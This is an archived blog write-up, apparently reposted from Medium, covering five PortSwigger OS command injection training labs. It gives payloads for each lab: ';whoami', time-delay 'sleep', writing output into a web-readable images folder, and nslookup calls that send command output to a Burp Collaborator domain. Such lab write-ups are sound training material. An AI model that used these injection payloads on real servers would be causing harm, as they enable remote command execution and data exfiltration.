# PortSwigger Os Command Injection Labs

- **Source URL:** https://zeeshandil.medium.com/portswigger-os-command-injection-labs-ed01d282f480?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126142432/https://zeeshandil.medium.com/portswigger-os-command-injection-labs-ed01d282f480
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1884 (id 1884)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# PortSwigger Os Command Injection Labs

OS command injection is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running an application, and typically fully compromise the application and all its data.

## LAB 1

As we know the vulnerability is in the stock check feature.Intercept the request in burp suite and analyse it.

We can execute any OS command after the productid.

In order to solve the lab we have to execute the **whoami** command.

Add the payload after the product id:

**;whoami**

## Lab 2

As mentioned in the lab description this time we have the blind Os Command injection.This is just like the normal os command injection but we will not see the command result in the response.So,we check it with time delay command.

We will execute the time delay command like **sleep 10** and if web app sleep for 10 second then it is vulnerable to the command injection.

We know the vulnerability is in the feedback section because it is mentioned in the lab description.Intercept the request in burp suite and analyse it in the repeater.

Test every field after the equal sign and after the command type # for comment out the rest of the field.

Payload: **;sleep 10 #**

In our case the email field is vulnerable to the os command injection.

## Lab 3

This is just like the previous Lab’s blind os command injection but this time we have to perform the data exfiltraion.

Just like the previous Lab again the vulnerable field is the email.

We can exfiltrate the data into the other application area which is publicly available and then we can view it.

Go to the http-history and enable the images filter.Next refresh the home page of the lab.

Send any image request to the repeater and change the image filename to any other filename and check if we can access the other images content or not by changing the image filename.

Go back to your previous blind command injection page and type the command.

Payload: **whoami > /var/www/images/whoami.txt #**

This will copy the content of whoami into the images folder and we already know we can access the images folder content.

Now go to the second request of image page which we capture in the repeater section and change the filename=whoami.txt

## Lab 4

Previously when we execute the sleep command the web application sleep for 10 sec and we get the response after 10 sec but this time when we execute any command it will execute as a separate thread so it will not effect the web application.

We can use burp collaborator to get the subdomain and then we will use nslookup for that domain and if we receive the dns query for that domain means our command is successfully executed and web application is vulnerable to the command injection.

Payload: ;**nslookup burpcollaborator\_subdomain.net #**

## Lab 5

This is just like the previous Lab but this time we have to perform the data exfiltration.

We have to follow all the steps which we did in the previous Lab but we have to change our payload this time for data exfiltration

Payload : ;nslookup \`whomi\`.burpcollaboratordomain.net #

Note: paste your command in the backtick not in single quotes.

Now send the request and check the burpcollaborator.
